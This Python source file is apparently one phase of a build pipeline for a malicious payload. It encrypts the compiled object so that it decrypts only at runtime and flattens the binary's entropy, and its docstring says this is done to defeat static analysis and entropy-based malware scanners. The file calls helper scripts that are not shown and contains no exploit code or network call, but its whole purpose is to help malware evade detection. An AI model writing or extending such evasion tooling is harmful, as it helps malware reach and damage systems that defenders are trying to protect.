"""
phase04_encrypt.py

Purpose:
Encrypts the compiled binary and applies entropy flattening to reduce
statistical distinguishability.  The encryption step wraps the object
file so that it can only be decrypted at runtime by the orbital-relay.

Architectural Role:
Runs after compilation.  Encrypted output is consumed by the native
payload header generation phase.

Execution Context:
Called from build.py during pipeline execution.

Dependencies:
json, os, sys, ..common, scripts.entropy_flatten

Security Relevance:
Binary encryption prevents static analysis of the compiled payload;
entropy flattening avoids detection via entropy-based malware scanners.
"""

import json  # noqa: F401 (this line binds a name used by an embedded template)
import os
import sys

from ..common import log, run, ROOT


def phase_encrypt_binary(input_o, output_enc):
    """
    Encrypt the compiled .o object file using the encrypt pipeline.

    Args:
        input_o: path to the input .o file
        output_enc: path for the encrypted output
    """
    log("ENCRYPT", f"{input_o} → {output_enc}")
    script = os.path.join(ROOT, "encrypt", "encrypt.py")
    if not os.path.exists(script):
        log("SKIP", "encrypt/encrypt.py not found, skipping")
        return
    run([sys.executable, script, "encrypt", input_o, "-o", output_enc])


def phase_entropy_flatten(input_bin, output_bin, config):
    """
    Flatten the binary's entropy profile to avoid statistical detection.

    Analyzes the entropy of .text, targets a median value, and rewrites
    the binary to match the target.

    Args:
        input_bin: path to input binary
        output_bin: path for entropy-flattened output
        config: pipeline config dict with entropy_flatten sub-key
    """
    log("ENTROPY_FLATTEN", f"{input_bin} → {output_bin}")
    script = os.path.join(ROOT, "scripts", "entropy_flatten.py")
    if not os.path.exists(script):
        log("SKIP", "scripts/entropy_flatten.py not found, skipping")
        return
    ef_config = config.get("entropy_flatten", {})
    if not ef_config.get("enabled", False):
        log("SKIP", "Entropy flatten not enabled in config")
        return
    try:
        with open(input_bin, "rb") as _f:
            _magic = _f.read(4)
        if _magic != b"\x7fELF":
            log("ERROR", f"Entropy flatten requires an ELF binary, got {input_bin} (magic={_magic!r})")
            return
        from scripts.entropy_flatten import EntropyAnalyzer, EntropyFlattener
        analyzer = EntropyAnalyzer()
        target = analyzer.target_entropy(input_bin)
        log("ENTROPY_FLATTEN", f"Target entropy (median .text): {target:.4f}")
        flattener = EntropyFlattener(target)
        flattener.flatten_binary(input_bin, output_bin, ef_config)
        size = os.path.getsize(output_bin)
        log("ENTROPY_FLATTEN", f"Done: {size/1024:.1f}KB")
    except ImportError as e:
        log("SKIP", f"entropy_flatten not importable: {e}")
    except Exception as e:
        log("ERROR", f"Entropy flatten failed: {e}")
